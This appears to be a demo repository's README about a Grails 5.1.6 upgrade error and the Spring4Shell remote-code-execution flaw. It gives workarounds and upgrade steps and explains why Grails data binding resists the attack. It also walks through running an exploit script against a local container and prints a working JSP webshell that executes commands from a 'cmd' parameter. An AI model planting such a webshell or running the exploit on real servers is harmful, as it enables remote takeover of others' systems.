# Hacking with Grails Issue 12460

When upgrading to Grails 5.1.6 with Spring 5.3.18, there was a error intruduced, it may be related with `groovyPagesTemplateEngine` in the `grails-gsp` plugin.
Because of [Spring Framework RCE](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement), many Grails and Spring apps are impacted. [This demo](https://github.com/rainboyan/grails-issue-12460-demo) report the error, and give a workaround to solve the problem.

```
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'groovyPagesTemplateEngine': Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'classLoader' of bean class [org.grails.gsp.GroovyPagesTemplateEngine]: Bean property 'classLoader' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
```

## How to Fix it, we need a Workaround

I read a lot the `grails-gsp` source code, found that `groovyPagesTemplateEngine` need a `GroovyPageClassLoader` to compile gsp, the `ref("classLoader")` is the parent class loader, so I think it may be the wrong with Spring Framework 5.3.18. Because `groovyPagesTemplateEngine` implements `BeanClassLoaderAware`, so there is no need to set classLoader property declaratively, spring will do this via the `setBeanClassLoader`. I've already submit a [PR](https://github.com/grails/grails-gsp/pull/257) for `grails-gsp`.

```
    // Setup the main templateEngine used to render GSPs
    groovyPagesTemplateEngine(GroovyPagesTemplateEngine) { bean ->
        classLoader = ref("classLoader")
        groovyPageLocator = groovyPageLocator
        if (enableReload) {
            reloadEnabled = enableReload
        }
        tagLibraryLookup = gspTagLibraryLookup
        jspTagLibraryResolver = jspTagLibraryResolver
        cacheResources = enableCacheResources
    }
```

Before `grails-gsp` new version to fix the issue, there is a workaround to do, we could add the `GrailsIssue12460PostProcessor` to remove `classLoader` from the propertyValues of bean `groovyPagesTemplateEngine` at the runtime,

```
class GrailsIssue12460PostProcessor implements MergedBeanDefinitionPostProcessor {
    @Override
    void postProcessMergedBeanDefinition(RootBeanDefinition beanDefinition, Class<?> beanType, String beanName) {
        if (beanName == 'groovyPagesTemplateEngine') {
            
            // Grails issue : https://github.com/grails/grails-core/issues/12460'
            
            beanDefinition.getPropertyValues().removePropertyValue("classLoader")
        }
    }
}
```

## Upgrade Tomcat to 9.0.62

Since Apache Tomcat 9.0.62 was released yet, and it's also fixed the class loader issue, so we should update it.  

```
Effectively disable the WebappClassLoaderBase.getResources() method as it is not used and if something accidently exposes the class loader this method can be used to gain access to Tomcat internals.
```

In `gradle.properties`, add `tomcat.version`:

```
tomcat.version=9.0.62
```

Then check the tomcat version, `./gradlew dependencies --configuration runtimeClasspath | grep org.apache.tomcat`

```
|    +--- org.apache.tomcat.embed:tomcat-embed-el:9.0.58 -> 9.0.62
|    |    |    |    |    \--- org.apache.tomcat:tomcat-jdbc:10.0.8 -> 9.0.62 (c)
|    +--- org.apache.tomcat.embed:tomcat-embed-core:9.0.58 -> 9.0.62
|    +--- org.apache.tomcat.embed:tomcat-embed-el:9.0.58 -> 9.0.62
|    \--- org.apache.tomcat.embed:tomcat-embed-websocket:9.0.58 -> 9.0.62
|         \--- org.apache.tomcat.embed:tomcat-embed-core:9.0.62
|    |    \--- org.apache.tomcat.embed:tomcat-embed-logging-log4j:8.5.2
+--- org.apache.tomcat:tomcat-jdbc -> 9.0.62
|    \--- org.apache.tomcat:tomcat-juli:9.0.62
```

## What about Grails 4?

Unfortunately, Grails 4 since last release 4.0.13 still use Spring Boot 2.1.x and Spring Framework 5.1.x, which are all [End of Support](https://spring.io/projects/spring-boot#support), so I created a [Grails 4 demo](https://github.com/rainboyan/grails4-upgrade-spring-demo) to show you how to Upgrade Spring to 5.3.18. I hope this demo will help you, but you should **Notice** that, Spring Framework 5.3.x changed lot and may not work with old Grails 4 plugins, please give a hard test and make sure it works.

## How to Check?

### Requirements

1. Docker
2. Python3 + requests library

### Checkout code

```
git checkout spring_rce
```

### Instructions

1. Clone the repository
2. Build grails war: `./gradlew clean build`
3. Build docker image: `docker build --build-arg WAR_FILE=build/libs/\*-plain.war -t grailsdemo`
4. Run the container: `docker run -p 8080:8080 grailsdemo`
5. App should now be available at Grails: `http://localhost:8080/helloworld/greeting`, 

![WebPage](screenshots/webpage_grails.png?raw=true)

Spring: `http://localhost:8080/helloworld/greeting2`

![WebPage](screenshots/webpage_spring.png?raw=true)

6. Check Grails app, run the exploit.py script:
 `python3 exploit.py --url "http://localhost:8080/helloworld/greeting"`

![WebPage](screenshots/runexploit_grails.png?raw=true)

Visit the created webshell! Modify the `cmd` GET parameter for your commands. (`http://localhost:8080/shell.jsp` by default)

![WebPage](screenshots/grails_shell.png?raw=true)

7. Check Spring app, run the exploit.py script:
 `python3 exploit.py --url "http://localhost:8080/helloworld/greeting2"`

![WebPage](screenshots/runexploit_spring.png?raw=true)

Visit the created webshell! Modify the `cmd` GET parameter for your commands. (`http://localhost:8080/shell.jsp` by default)

![WebPage](screenshots/spring_shell.png?raw=true)

8. Check `shell.jsp` exists in Docker container,
  `docker ps`

```
CONTAINER ID   IMAGE              COMMAND             CREATED          STATUS          PORTS                    NAMES
893cfe5dec67   grailsdemo         "catalina.sh run"   18 seconds ago   Up 18 seconds   0.0.0.0:8080->8080/tcp   unruffled_chaum
```

  `docker exec -i -t 893cfe5dec67 /bin/bash`

```bash
root@893cfe5dec67:/usr/local/tomcat# cd webapps
root@893cfe5dec67:/usr/local/tomcat/webapps# ls
ROOT  helloworld  helloworld.war

root@893cfe5dec67:/usr/local/tomcat/webapps# cd ROOT
root@893cfe5dec67:/usr/local/tomcat/webapps/ROOT# ls
shell.jsp
```

Below is the content of `shell.jsp`,
```
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %>//
```

## Conclusion

In this demo, build with Grails 5.1.6 with Spring 5.3.17, packaged as WAR Spring MVC applications and deployed in Tomcat 9.0.52 running on JDK 11. For demonstration, I created Two version `Greeting` web controller, 

- Grails version: `grails-app/controllers/org/grails/demo/GreetingController.groovy`
- Spring version: `src/main/groovy/org/grails/demo/HelloController.java`

The Spring controller method use annotated with `@ModelAttribute`, as the [Spring Framework RCE](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement) reported, it's exploited indeed! When I upgrade Spring Framework to 5.3.18, it's Fixed! Spring team give some suggested workarounds, 

- Upgrading Tomcat
- Downgrading to Java 8
- Disallowed Fields

`src/main/groovy/org/grails/demo/HelloController.java`
```java
@Controller
public class HelloController {

    @PostMapping("/greeting2")
    public String greetingSubmit(@ModelAttribute Greeting greeting, Model model) {
        return "hello";
    }

}
```

In the Grails version, it is not vulnerable to the exploit. Why? Grails applications are built on top of Spring and Spring Boot, Grails team has taken this vulnerability very seriously, and give the answer in there blog,

> Grails framework has its own data-binding logic, which includes checks to validate that a given property a) is in a list of properties that may be bound to, and b) exists within the target metaClass. All other property candidates are ignored.

I digg into the code, as they said, `SimpleDataBinder` check all properties to binding.

`grails-databinding/src/main/groovy/grails/databinding/SimpleDataBinder.groovy`
```groovy
    protected void doBind(obj, DataBindingSource source, String filter, List whiteList, List blackList, DataBindingListener listener, errors) {

        def keys = source.getPropertyNames()
        for (String key in keys) {
            if (!filter || key.startsWith(filter + '.')) {
                String propName = key
                if (filter) {
                    propName = key[(1+filter.size())..-1]
                }
                def metaProperty = obj.metaClass.getMetaProperty propName

                if (metaProperty) { // normal property
                    if (isOkToBind(metaProperty.name, whiteList, blackList)) {
                       // ...
                    }
                } else {
                    def descriptor = getIndexedPropertyReferenceDescriptor propName
                    if (descriptor) { // indexed property
                        metaProperty = obj.metaClass.getMetaProperty descriptor.propertyName
                        if (metaProperty && isOkToBind(metaProperty.name, whiteList, blackList)) {
                           // ...
                        }
                    } else if (propName.startsWith('_') && propName.length() > 1) { // boolean special handling
                        def restOfPropertyName = propName[1..-1]
                        if (!source.containsProperty(restOfPropertyName)) {
                            metaProperty = obj.metaClass.getMetaProperty restOfPropertyName
                            if (metaProperty && isOkToBind(restOfPropertyName, whiteList, blackList)) {
                               // ...
                            }
                        }
                    }
                }
            }
        }
    }

    protected isOkToBind(String propName, List whiteList, List blackList) {
        'metaClass' != propName && !blackList?.contains(propName) && (!whiteList || whiteList.contains(propName) || whiteList.find { it -> it?.toString()?.startsWith(propName + '.')})
    }
```

The known exploit is one mechanism that can be used for this vulnerability. Please keep a close eye on the follow-up to this event, but don't **PANIC**!

## Links
- [Spring Framework RCE, Early Announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)
- [Spring Framework RCE, Mitigation Alternative](https://spring.io/blog/2022/04/01/spring-framework-rce-mitigation-alternative)
- [Spring 5.3.18 issue#28261, Restrict access to property paths on Class references](https://github.com/spring-projects/spring-framework/issues/28261)
- [Apache Tomcat 9.0.62 released](https://tomcat.apache.org/tomcat-9.0-doc/changelog.html#Tomcat_9.0.62_(remm))
- [Grails 5.1.6: integration tests, bootRun, bootWar are broken](https://github.com/grails/grails-core/issues/12460)
- [Grails GSP - Fixed Grails issue #12460](https://github.com/grails/grails-gsp/pull/257)
- [Grails 4 upgrade Spring 5.3.18 demo](https://github.com/rainboyan/grails4-upgrade-spring-demo)
- [Will Dormann twitter status](https://twitter.com/wdormann/status/1509372145394200579)
- [Spring4Shell-POC](https://github.com/lunasec-io/Spring4Shell-POC)